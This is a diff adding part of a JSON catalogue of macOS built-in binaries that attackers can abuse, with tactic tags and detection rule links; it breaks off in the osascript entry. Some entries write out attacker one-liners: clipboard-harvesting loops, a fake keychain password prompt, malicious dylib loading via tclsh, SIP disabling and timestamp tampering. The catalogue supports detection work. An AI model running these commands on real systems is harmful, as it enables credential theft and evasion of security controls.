@@ -1,0 +1,3431 @@
+[
+    {
+        "name": "ioreg",
+        "author": "Cedric Owens (@cedowens)",
+        "short_description": "Displays a hierarchial view of the I/O Kit registry.",
+        "full_description": "The I/O Kit registry (ioreg) is a useful binary that can be used to gather data such as detecting if a VM is used, getting USB device vendor names, checking if a screen is locked, etc.",
+        "created": "2023-04-20",
+        "example_use_cases": [
+            {
+                "name": "Use ioreg to check whether the remote macOS screen is locked.",
+                "description": "The following command will display a list of keys that contain \"CGSSession\". If the key \"CGSSessionScreenIsLocked\" is present, the screen is actively locked.",
+                "code": "ioreg -n Root -d1 -a | grep CGSSession",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "oneliner",
+                    "lockscreen"
+                ]
+            },
+            {
+                "name": "Use ioreg to check whether the host is on a physical machine or a VM",
+                "description": "Check the output of this command (the IOPlatformSerialNumber, board-id, and manufacturer fields) to check whether or not this host is in a virtual machine.",
+                "code": "ioreg -rd1 -c IOPlatformExpertDevice",
+                "tactics": [
+                    "Discovery",
+                    "Collection"
+                ],
+                "tags": [
+                    "oneliner",
+                    "vmcheck"
+                ]
+            },
+            {
+                "name": "Use ioreg to check USB device vendor names",
+                "description": "Grep for \"USB Vendor Name\" values to view USB vendor names. On virtualized hardware these values may contain the hypervisor name such as \"VirtualBox\". This is an additional way to check for virtualization.",
+                "code": "ioreg -rd1 -c IOUSBHostDevice",
+                "tactics": [
+                    "Discovery",
+                    "Collection"
+                ],
+                "tags": [
+                    "oneliner",
+                    "vmcheck"
+                ]
+            },
+            {
+                "name": "Check all ioreg properties for hypervisor names.",
+                "description": "Grep for \"virtual box\", \"oracle\", and \"vmware\" from the output of the ioreg -l command. This is an additional way to check for virtualization.",
+                "code": "ioreg -l",
+                "tactics": [
+                    "Discovery",
+                    "Collection"
+                ],
+                "tags": [
+                    "oneliner",
+                    "vmcheck"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/ioreg"
+        ],
+        "detections": [
+            {
+                "name": "System Information Discovery Using Ioreg",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_ioreg_discovery.yml"
+            },
+            {
+                "name": "Jamf Protect: Ioreg used to detect if the screen is locked",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/lockscreen_check"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Evasions: macOS",
+                "url": "https://evasions.checkpoint.com/src/MacOS/macos.html"
+            },
+            {
+                "name": "SwiftBelt-JXA Situational Awareness Tool",
+                "url": "https://github.com/cedowens/SwiftBelt-JXA/blob/main/SwiftBelt-JXA.js#520"
+            }
+        ]
+    },
+    {
+        "name": "sw_vers",
+        "author": "Eliott (@Koyiott)",
+        "short_description": "Prints macOS version information.",
+        "full_description": "sw_vers prints macOS version information, including the exact macOS version number.",
+        "created": "2023-09-11",
+        "example_use_cases": [
+            {
+                "name": "Retrieving macOS Version Information",
+                "description": "Fetch detailed macOS version information including the build version, product name, and product version.",
+                "code": "sw_vers",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Retrieving macOS Product Version",
+                "description": "Fetch macOS product version.",
+                "code": "sw_vers -productVersion",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Retrieving macOS Product Name",
+                "description": "Fetch detailed macOS product name.",
+                "code": "sw_vers -productName",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Retrieving macOS Build Version",
+                "description": "Fetch detailed macOS build version.",
+                "code": "sw_vers -buildVersion",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "configuration"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/sw_vers"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS/binaries/sw_vers",
+                "url": "https://macosbin.com/bin/sw_vers"
+            },
+            {
+                "name": "sw_vers man page",
+                "url": "https://ss64.com/osx/sw_vers.html"
+            }
+        ]
+    },
+    {
+        "name": "dscl",
+        "author": "Jonathan Bar Or (@yo_yo_yo_jbo)",
+        "short_description": "Interact with Directory Services.",
+        "full_description": "An extensive tool for communicating with the Directory Services, useful for Discovery.",
+        "created": "2023-04-25",
+        "example_use_cases": [
+            {
+                "name": "Local user enumeration",
+                "description": "Enumerate all local users.",
+                "code": "dscl . -list /Users\ndscl . list /Users\ndscl . ls /Users\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "users"
+                ]
+            },
+            {
+                "name": "Active Directory user enumeration",
+                "description": "Enumerate all Active Directory users.",
+                "code": "dscl \"/Active Directory/TEST/All Domains\" -list /Users\ndscl \"/Active Directory/TEST/All Domains\" list /Users\ndscl \"/Active Directory/TEST/All Domains\" ls /Users\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "users"
+                ]
+            },
+            {
+                "name": "Local user information gathering",
+                "description": "Gain useful local user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.",
+                "code": "dscl . -read /Users/$USERNAME\ndscl . read /Users/$USERNAME\ndscl . cat /Users/$USERNAME\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "users",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Active Directory user information gathering",
+                "description": "Gain useful Active Directory user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.",
+                "code": "dscl \"/Active Directory/TEST/All Domains\" -read /Users/$USERNAME\ndscl \"/Active Directory/TEST/All Domains\" read /Users/$USERNAME\ndscl \"/Active Directory/TEST/All Domains\" cat /Users/$USERNAME\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "users",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Local group enumeration",
+                "description": "Enumerate all local groups.",
+                "code": "dscl . -list /Groups\ndscl . list /Groups\ndscl . ls /Groups\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "groups"
+                ]
+            },
+            {
+                "name": "Active Directory group enumeration",
+                "description": "Enumerate all Active Directory groups.",
+                "code": "dscl \"/Active Directory/TEST/All Domains\" -list /Groups\ndscl \"/Active Directory/TEST/All Domains\" list /Groups\ndscl \"/Active Directory/TEST/All Domains\" ls /Groups\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "groups"
+                ]
+            },
+            {
+                "name": "Local group information gathering",
+                "description": "Gain useful local group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the \"admin\" group.",
+                "code": "dscl . -read /Groups/$GROUPNAME\ndscl . read /Groups/$GROUPNAME\ndscl . cat /Groups/$GROUPNAME\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "groups",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Active Directory group information gathering",
+                "description": "Gain useful Active Directory group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the \"admin\" group.",
+                "code": "dscl \"/Active Directory/TEST/All Domains\" -read /Groups/$GROUPNAME\ndscl \"/Active Directory/TEST/All Domains\" read /Groups/$GROUPNAME\ndscl \"/Active Directory/TEST/All Domains\" cat /Groups/$GROUPNAME\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "groups",
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Computer enumration",
+                "description": "Enumerate all computers in an Active Directory.",
+                "code": "dscl  \"/Active Directory/TEST/All Domains\" -list /Computers\ndscl  \"/Active Directory/TEST/All Domains\" list /Computers\ndscl  \"/Active Directory/TEST/All Domains\" ls /Computers\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "shares"
+                ]
+            },
+            {
+                "name": "Share enumration",
+                "description": "Enumerate all shares.",
+                "code": "dscl . -list /SharePoints\ndscl . list /SharePoints\ndscl . ls /SharePoints\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "network",
+                    "shares"
+                ]
+            },
+            {
+                "name": "Password policy discovery",
+                "description": "Gain password policy information",
+                "code": "dscl . -read /Config/shadowhash\ndscl . read /Config/shadowhash\ndscl . cat /Config/shadowhash\n",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "password",
+                    "policy"
+                ]
+            },
+            {
+                "name": "Change a user password",
+                "description": "Change an existing user's password.",
+                "code": "dscl . passwd /Users/$USERNAME oldPassword newPassword",
+                "tactics": [
+                    "Persistence"
+                ],
+                "tags": [
+                    "password"
+                ]
+            },
+            {
+                "name": "Local account creation",
+                "description": "Create a local account",
+                "code": "dscl -create",
+                "tactics": [
+                    "Persistence"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/dscl"
+        ],
+        "detections": [
+            {
+                "name": "Jamf Protect: Detect user account creation with dscl",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/user_created_by_dscl"
+            }
+        ],
+        "resources": [
+            {
+                "name": "MacOS Red Teaming - HackTricks",
+                "url": "https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-red-teaming"
+            },
+            {
+                "name": "MITRE ATT&CK T1136.001 Create Account: Local Account",
+                "url": "https://attack.mitre.org/techniques/T1136/001/"
+            }
+        ]
+    },
+    {
+        "name": "softwareupdate",
+        "author": "Jonathan Bar Or (@yo_yo_yo_jbo)",
+        "short_description": "Interact with the macOS software update service.",
+        "full_description": "A command-line utility for running software updates.",
+        "created": "2023-04-25",
+        "example_use_cases": [
+            {
+                "name": "Get OS and browser version information",
+                "description": "Determine OS and Safari version by enumerating the available software updates.",
+                "code": "softwareupdate --list",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "os"
+                ]
+            },
+            {
+                "name": "Get OS update policy",
+                "description": "Use the --schedule flag to return the OS update policy.",
+                "code": "softwareupdate --schedule",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "os"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/softwareupdate"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "softwareupdate Man Page",
+                "url": "https://ss64.com/osx/softwareupdate.html"
+            }
+        ]
+    },
+    {
+        "name": "nvram",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Access and manage the host's non-volatile random-access memory (NVRAM).",
+        "full_description": "Access and manage the host's non-volatile random-access memory (NVRAM).",
+        "created": "2023-05-23",
+        "example_use_cases": [
+            {
+                "name": "Get nvram variables",
+                "description": "The -p option prints all the nvram variables that contain some potentially sensitive information like WiFi SSIDs and Bluetooth devices.",
+                "code": "nvram -p",
+                "tactics": [
+                    "Discovery"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/nvram"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing.",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "SS64 man page",
+                "url": "https://ss64.com/osx/nvram.html"
+            }
+        ],
+        "acknowledgements": [
+            "Jonathan Bar Or (@yo_yo_yo_jbo)"
+        ]
+    },
+    {
+        "name": "mktemp",
+        "author": "Tim Peck (@B0bby_Tablez)",
+        "short_description": "Create a temporary file or directory and return the file/directory name to stdout",
+        "full_description": "The mktemp binary located in \"usr/bin/mktemp\" can generate unique directory or file names and has historically been used to generate unique payloads.",
+        "created": "2023-06-28",
+        "example_use_cases": [
+            {
+                "name": "Generate payload directory (Shlayer)",
+                "description": "The following command can be used to generate a random directory name for staging payloads",
+                "code": "export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\"",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "Payload"
+                ]
+            },
+            {
+                "name": "Generate directory based on template file (Bundlore)",
+                "description": "The following command can be used to generate a unique directory based on a template",
+                "code": "TMP_DIR=\"mktemp -d -t x\"",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "Payload"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/mktemp"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Shlayer malware abusing Gatekeeper bypass on macOS",
+                "url": "https://www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/"
+            },
+            {
+                "name": "20 Common Tools & Techniques Used by macOS Threat Actors & Malware",
+                "url": "https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/"
+            }
+        ]
+    },
+    {
+        "name": "dsconfigad",
+        "author": "Ethan Nay",
+        "short_description": "retrieves/changes configuration for Directory Services Active Directory Plugin.",
+        "full_description": "This tool allows command-line configuration of the Active Directory Plug-in. dsconfigad has the same functionality for configuring the Active Directory plugin as the Directory Utility application. It requires \"admin\" privileges to the local workstation and to the Directory to make changes.",
+        "created": "2023-08-23",
+        "example_use_cases": [
+            {
+                "name": "Retrieves the Active Directory configuration",
+                "description": "Retrieves the Active Directory configuration",
+                "code": "dsconfigad -show",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Retrieves the Active Directory name",
+                "description": "Retrieves the Active Directory name",
+                "code": "dsconfigad -show |awk '/Active Directory Domain/{print $NF}'",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/dsconfigad"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS/binaries/dsconfigad",
+                "url": "https://macosbin.com/bin/dsconfigad"
+            },
+            {
+                "name": "dsconfigad man page",
+                "url": "https://www.unix.com/man-page/osx/8/dsconfigad/"
+            }
+        ]
+    },
+    {
+        "name": "swift",
+        "author": "0v3rride (https://github.com/0v3rride)",
+        "short_description": "Arbitrarily execute swift code from the terminal.",
+        "full_description": "The swift command is an interactive environment (REPL) for Swift.",
+        "created": "2023-12-23",
+        "example_use_cases": [
+            {
+                "name": "Execute Swift code file",
+                "description": "Executes the Swift code that is in a .swift file",
+                "code": "swift mycode.swift",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "swift",
+                    "repl",
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Execute Swift one-liner before swift 5.8 / Xcode 14.3 Beta 1",
+                "description": "Executes a Swift one-liner by piping an echoed string into the swift command",
+                "code": "echo 'print(\"loobins\")' | swift -",
+                "tactics": [
+                    "Execution",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "swift",
+                    "repl",
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Execute Swift one-liner with swift 5.8 / Xcode 14.3 Beta 1 or greater",
+                "description": "Executes a Swift one-liner that executes the ls command to list the current directory using the -e option that was implemented in swift 5.8 / Xcode 14.3 Beta 1",
+                "code": "swift -e 'import Foundation; let process = Process(); process.executableURL = URL(fileURLWithPath:\"/bin/bash\"); process.arguments = [\"-c\", \"ls -alh\"]; let stdout = Pipe(); let stderr = Pipe(); process.standardOutput = stdout; process.standardError = stderr; try process.run(); print(String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)); print(String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self));'",
+                "tactics": [
+                    "Execution",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "swift",
+                    "repl",
+                    "bash",
+                    "zsh"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/swift"
+        ],
+        "detections": [
+            {
+                "name": "Process & Command Line Argument Detection (process contains swift)",
+                "url": "N/A"
+            },
+            {
+                "name": "Jamf Protect: Detect arbitrary code execution using a swift one-liner",
+                "url": "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/swift_oneline_command_execution"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Introduction to the Swift REPL",
+                "url": "https://developer.apple.com/swift/blog/?id=18"
+            },
+            {
+                "name": "Scripting and Compiling Swift on the Command Line",
+                "url": "https://jblevins.org/log/swift"
+            },
+            {
+                "name": "Scripting in Swift is Pretty Awesome",
+                "url": "https://krakendev.io/blog/scripting-in-swift"
+            },
+            {
+                "name": "Swift -e runs code directly from the command line",
+                "url": "https://blog.eidinger.info/swift-e-runs-code-directly-from-the-command-line"
+            },
+            {
+                "name": "Swift Programming From The Command Line",
+                "url": "https://ed.com/command-line-swift/"
+            }
+        ]
+    },
+    {
+        "name": "tclsh",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Run Tcl files or shell commands from standard input.",
+        "full_description": "tclsh is a shell-like utility that runs Tcl from standard input or a file. tclsh holds the \"com.apple.security.cs.disable-library-validation\" entitlement and is capable of loading arbitary plug-ins, framework, and libraries without requiring signed code.",
+        "created": "2023-05-17",
+        "example_use_cases": [
+            {
+                "name": "Execute malicious dynamic library (.dylib) from standard input",
+                "description": "An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.",
+                "code": "echo \"load bad.dylib\" | tclsh",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "dylib"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/tclsh"
+        ],
+        "detections": [
+            {
+                "name": "Recommendations included in resource below. No formal detection content at this time.",
+                "url": "https://medium.com/specter-ops-posts/dylib-loads-that-tickle-your-fancy-d25196addd8c"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Dylib Loads that Tickle your Fancy",
+                "url": "https://medium.com/specter-ops-posts/dylib-loads-that-tickle-your-fancy-d25196addd8c"
+            }
+        ],
+        "acknowledgements": [
+            "Leo Pitt (@_D00mfist)"
+        ]
+    },
+    {
+        "name": "csrutil",
+        "author": "Megan Carney (https://infosec.exchange/@PwnieFan)",
+        "short_description": "Configure or view system security policies.",
+        "full_description": "Used to enable/disable SIP, configure netboot and authenticated-root settings",
+        "created": "2023-05-14",
+        "example_use_cases": [
+            {
+                "name": "Disable SIP",
+                "description": "disable SIP (System Integrity Protection) - requires booting into recovery mode",
+                "code": "csrutil disable",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "users"
+                ]
+            },
+            {
+                "name": "Disable authenticated-root",
+                "description": "When authenticated-root is disabled, booting is allowed from non-sealed system snapshots - requires booting into recovery mode",
+                "code": "csrutil authenticated-root disable",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "users"
+                ]
+            },
+            {
+                "name": "Add a netboot server",
+                "description": "Insert a new IPv4 address in the list of allowed NetBoot sources",
+                "code": "csrutil netboot add <address>",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Map infrastructure",
+                "description": "List allowed NetBoot sources",
+                "code": "csrutil netboot list",
+                "tactics": [
+                    "Reconnaissance",
+                    "Discovery"
+                ],
+                "tags": [
+                    "configuration"
+                ]
+            },
+            {
+                "name": "Determine if SIP is enabled",
+                "description": "Determine if System Integrity Protection is enabled",
+                "code": "csrutil status",
+                "tactics": [
+                    "Discovery"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/csrutil"
+        ],
+        "detections": [
+            {
+                "name": "Sigma: System Integrity Protection (SIP) Disabled",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_csrutil_disable.yml"
+            },
+            {
+                "name": "Sigma: System Integrity Protection (SIP) Enumeration",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_csrutil_status.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Discussion on how SIP interacts with bless and netboot",
+                "url": "https://developer.apple.com/forums/thread/4002"
+            },
+            {
+                "name": "MITRE ATT&CK T1518.001 Software Discovery: Security Software Discovery",
+                "url": "https://attack.mitre.org/techniques/T1518/001/"
+            },
+            {
+                "name": "The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSSBackdoor Planting in Safari, and LeveragesTwo Zero-day Exploits",
+                "url": "https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf"
+            }
+        ]
+    },
+    {
+        "name": "pbpaste",
+        "author": "Brendan Chamberlain (@infosecB)",
+        "short_description": "Paste the contents of clipboard to the terminal.",
+        "full_description": "Retrieves the contents of the clipboard (a.k.a. pasteboard) and writes them to the standard output (stdout). The utility is often used for creating new files with the clipboard content or for piping clipboard contents to other commands. It can also be used in shell scripts that may require clipboard content as input.",
+        "created": "2023-04-11",
+        "example_use_cases": [
+            {
+                "name": "Use pbpaste to collect sensitive clipboard data",
+                "description": "A pbpaste bash loop can continously collect clipboard contents every x minutes and write contents to a file (or another location). This may allow an attacker to gather user credentials or collect other sensitive information.",
+                "code": "while true; do echo $(pbpaste) >> loot.txt; sleep 10; done",
+                "tactics": [
+                    "Credential Access",
+                    "Collection"
+                ],
+                "tags": [
+                    "bash",
+                    "oneliner"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/pbpaste"
+        ],
+        "detections": [
+            {
+                "name": "Sigma: Clipboard Data Collection Via Pbpaste",
+                "url": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/macos/process_creation/proc_creation_macos_pbpaste_execution.yml"
+            }
+        ],
+        "resources": [
+            {
+                "name": "Hacking macOS: How to Dump 1Password, KeePassX & LastPass Passwords in Plaintext",
+                "url": "https://medium.com/@NullByteWht/hacking-macos-how-to-dump-1password-keepassx-lastpass-passwords-in-plaintext-723c5b1c311b"
+            },
+            {
+                "name": "Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - pbpaste",
+                "url": "https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-b65"
+            }
+        ]
+    },
+    {
+        "name": "kextstat",
+        "author": "Mark Morowczynsk (@markmorow)",
+        "short_description": "Display the status of loaded kernal extensions (kexts)",
+        "full_description": "Deprecated tool in favor of kmutil. Lists loaded kernal extensions",
+        "created": "2023-07-30",
+        "example_use_cases": [
+            {
+                "name": "List kernel extensions",
+                "description": "Uses kexstat showloaded to display kernel extensions and address in kernel memory it has been loaded",
+                "code": "kexstat",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "kernel"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/sbin/kextstat"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "n/a"
+            }
+        ],
+        "resources": [
+            {
+                "name": "kextstat man page",
+                "url": "https://ss64.com/osx/kextstat.html"
+            }
+        ]
+    },
+    {
+        "name": "SetFile",
+        "author": "Chris Campbell (@texasbe2trill)",
+        "short_description": "Set attributes of files and directories.",
+        "full_description": "Uses the CommandLine/Terminal to set file and or directory attributes. It can set attributes, creator, creation date, modification date, and file type for multiple files at a time.",
+        "created": "2023-04-23",
+        "example_use_cases": [
+            {
+                "name": "Set a file or directory attribute to invisible",
+                "description": "A bash or zsh oneliner can allow an attacker to set the file attribute to invisible. This action can establish persistence and evade detection for malicious files on the system.",
+                "code": "for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done",
+                "tactics": [
+                    "Persistence",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "oneliner"
+                ]
+            },
+            {
+                "name": "Change a file's creation and modification timestamps",
+                "description": "Setfile can be used with the -d and -m arguments to alter a file's creation and modification date, respectively.",
+                "code": "SetFile -d \"04/25/2023 11:11:00\" -m \"04/25/2023 11:12:00\" targetfile.txt",
+                "tactics": [
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "oneliner"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/SetFile"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "The Invisible Bit",
+                "url": "https://daringfireball.net/2008/04/the_invisible_bit"
+            }
+        ]
+    },
+    {
+        "name": "GetFileInfo",
+        "author": "Chris Campbell (@texasbe2trill)",
+        "short_description": "Get attributes of files and directories.",
+        "full_description": "Uses the CommandLine/Terminal to return type, creator, attributes, created, and modified file information of a file or directory.",
+        "created": "2023-04-23",
+        "example_use_cases": [
+            {
+                "name": "Iterate through a directory to GetFileInfo",
+                "description": "A bash or zsh oneliner can provide an attacker with information about specific files of interest.",
+                "code": "for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done",
+                "tactics": [
+                    "Discovery"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh",
+                    "oneliner"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/GetFileInfo"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS/binaries/GetFileInfo",
+                "url": "https://macosbin.com/bin/getfileinfo"
+            }
+        ]
+    },
+    {
+        "name": "caffeinate",
+        "author": "Ethan Nay",
+        "short_description": "Prevent the system from sleeping on behalf of a utility.",
+        "full_description": "caffeinate creates assertions to alter system sleep behavior.  If no assertion flags are specified, caffeinate creates an assertion to prevent idle sleep.\nIf a utility is specified, caffeinate creates the assertions on the utility's behalf, and those assertions will persist for the duration of the utility's execution.\nOtherwise, caffeinate creates the assertions directly, and those assertions will persist until caffeinate exits.",
+        "created": "2023-07-12",
+        "example_use_cases": [
+            {
+                "name": "Fork a process",
+                "description": "Make caffeinate fork a process and hold an assertion that prevents idle sleep as long as that process is running",
+                "code": "caffeinate -i /tmp/evil",
+                "tactics": [
+                    "Execution",
+                    "Defense Evasion"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            },
+            {
+                "name": "Prevent a sleep",
+                "description": "Prevent a macOS from going to sleep for 4 hours (14400 seconds)",
+                "code": "caffeinate -u -t 14400",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "bash",
+                    "zsh"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/caffeinate"
+        ],
+        "detections": [
+            {
+                "name": "No detections at time of publishing",
+                "url": "N/A"
+            }
+        ],
+        "resources": [
+            {
+                "name": "macOS/binaries/caffeinate",
+                "url": "https://macosbin.com/bin/caffeinate"
+            },
+            {
+                "name": "caffeinate man page",
+                "url": "https://ss64.com/osx/caffeinate.html"
+            }
+        ]
+    },
+    {
+        "name": "osascript",
+        "author": "Cedric Owens (@cedowens)",
+        "short_description": "Execute AppleScripts and other OSA language scripts and commands.",
+        "full_description": "The osascript binary is a command-line utility included in macOS that allows users to run AppleScript and Open Scripting Architecture (OSA) scripts or commands. AppleScript is a scripting language that is designed for power users to automate various tasks, application actions, and to interact with the operating system.",
+        "created": "2023-04-19",
+        "example_use_cases": [
+            {
+                "name": "Use the osascript binary to gather sensitive clipboard data",
+                "description": "A bash loop can gather clipboard contents over a defined time period. The following command calls /usr/bin/osascript -e 'return (the clipboard)' indefinitely every 10 seconds and writes clipboard content to a text file.",
+                "code": "while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done",
+                "tactics": [
+                    "Collection",
+                    "Credential Access"
+                ],
+                "tags": [
+                    "clipboard",
+                    "bash",
+                    "oneliner",
+                    "osascript"
+                ]
+            },
+            {
+                "name": "Use the osascript binary to gather system information",
+                "description": "osascript can be used to gather the operating system version, current username, user ID, computer name, IP address, and other information.",
+                "code": "osascript -e 'return (system info)'",
+                "tactics": [
+                    "Collection",
+                    "Discovery"
+                ],
+                "tags": [
+                    "systeminfo",
+                    "oneliner",
+                    "osascript"
+                ]
+            },
+            {
+                "name": "Use the osascript binary to prompt the user for credentials",
+                "description": "osascript can be used to generate a dialogue box and request the user to enter the keychain password.",
+                "code": "osascript -e 'set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer'",
+                "tactics": [
+                    "Credential Access"
+                ],
+                "tags": [
+                    "oneliner",
+                    "prompt",
+                    "osascript"
+                ]
+            },
+            {
+                "name": "Use the osascript binary to execute a JXA (JavaScript for Automation) file.",
+                "description": "JXA is often used by red teams (and potentially attackers) as a macOS payload, as JXA is native to macOS and can access various internal macOS APIs (such as Cocoa, Foundation, OSAKit, etc.). The osascript binary can be used to execute JXA payloads by simply running \"osascript [file.js]\" but some malware or offensive tools may also use \"osascript -l JavaScript [file.js]\".",
+                "code": "echo \"ObjC.import('Cocoa');\\nObjC.import('stdlib');\\nvar currentApp = Application.currentApplication();\\ncurrentApp.includeStandardAdditions = true;\\ncurrentApp.doShellScript('open -a Calculator.app');\" > calc.js && osascript -l JavaScript calc.js",
+                "tactics": [
+                    "Execution"
+                ],
+                "tags": [
+                    "jxa",
+                    "osascript"
+                ]
+            }
+        ],
+        "paths": [
+            "/usr/bin/osascript"
+        ],
+        "detections": [
+            {
+                "name": "Command Line Argument Detection (args contain osascript AND -e AND clipboard)",
+                "url": "N/A"
+            },
+            {
+                "name": "Jamf Protect: Detect activity that is related to osascript gathering clipboard content",
